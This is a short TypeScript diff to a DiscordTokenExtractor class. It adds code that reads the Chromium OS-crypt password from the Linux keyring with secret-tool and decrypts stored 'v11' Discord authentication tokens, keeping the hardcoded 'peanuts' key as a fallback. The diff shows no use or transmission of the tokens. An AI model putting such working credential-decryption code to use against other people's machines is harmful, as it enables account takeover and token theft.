@@ -339,8 +339,34 @@ export class DiscordTokenExtractor {
   }
 
   private decryptLinuxToken(encryptedData: Buffer): string | null {
+    const prefix = encryptedData.subarray(0, 3).toString()
+    if (prefix === 'v11') {
+      const result = this.decryptV11LinuxToken(encryptedData)
+      if (result) return result
+    }
+    // v10 or fallback
     const key = pbkdf2Sync('peanuts', 'saltysalt', 1, 16, 'sha1')
     return this.decryptAESCBC(encryptedData, key)
+  }
+
+  private getLinuxKeyringPassword(appName: string): string {
+    return execSync(
+      `secret-tool lookup xdg:schema chrome_libsecret_os_crypt_password_v2 application ${appName}`,
+      { timeout: 5000, encoding: 'utf8' },
+    ).trim()
+  }
+
+  private decryptV11LinuxToken(encryptedData: Buffer): string | null {
+    const appNames = ['discord', 'Discord']
+    for (const appName of appNames) {
+      try {
+        const keyringPassword = this.getLinuxKeyringPassword(appName)
+        const key = pbkdf2Sync(keyringPassword, 'saltysalt', 1, 16, 'sha1')
+        const result = this.decryptAESCBC(encryptedData, key)
+        if (result) return result
+      } catch {}
+    }
+    return null
   }
 
   private decryptAESCBC(encryptedData: Buffer, key: Buffer): string | null {
